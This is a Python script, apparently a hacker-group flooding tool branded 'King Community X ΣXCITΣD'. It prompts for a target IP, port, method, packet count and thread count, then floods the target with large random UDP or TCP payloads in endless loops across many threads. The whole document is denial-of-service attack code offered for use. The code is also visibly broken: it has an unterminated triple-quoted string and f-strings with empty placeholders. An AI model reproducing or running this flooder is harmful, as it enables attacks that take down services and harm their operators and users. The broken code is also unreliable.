#King Community X ΣXCITΣD
#MauRenameLuKontol?
#Code By ΣXCITΣD

import random
import socket
import threading
import time

print("""\033[1;31;40m | UDP | TCP | """)

print("\033[91m===================================\n")
print(""""\033[95m>>> Code By :\033[91m ΣXCITΣD 13
print("\033[91m===================================\n")
ip = str(input("\033[94m IP \033[1;31;40m  ====> : "))
port = int(input(" \033[94mPort \033[1;31;40m====> : "))
choice = str(input(" \033[94mMetods \033[1;31;40m     ====> : "))
times = int(input(" \033[94mPaket \033[1;31;40m      ====> : "))
threads = int(input("\033[94m Threads \033[1;31;40m    ====> : "))

def udp():
	data = random._urandom(102498)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(f" King Community X ΣXCITΣD Attack IP \033[97m{} \033[91m Port \033[97m{}")
		except:
			print(f" King Community X ΣXCITΣD Attack To IP \033[97m{} \033[91m Port \033[97m{} ")

def tcp():
	data = random._urandom(102498)
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(f" King Community X ΣXCITΣD Attack To IP \033[97m{} \033[91m Port \033[97m{}")
		except:
			s.close()
			print(f"King Community X ΣXCITΣD Attack To IP \033[97m{} \033[91m Port \033[97m{}")


for y in range(threads):
    if choice == 'UDP':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP':
        th = threading.Thread(target = tcp)
        th.start()
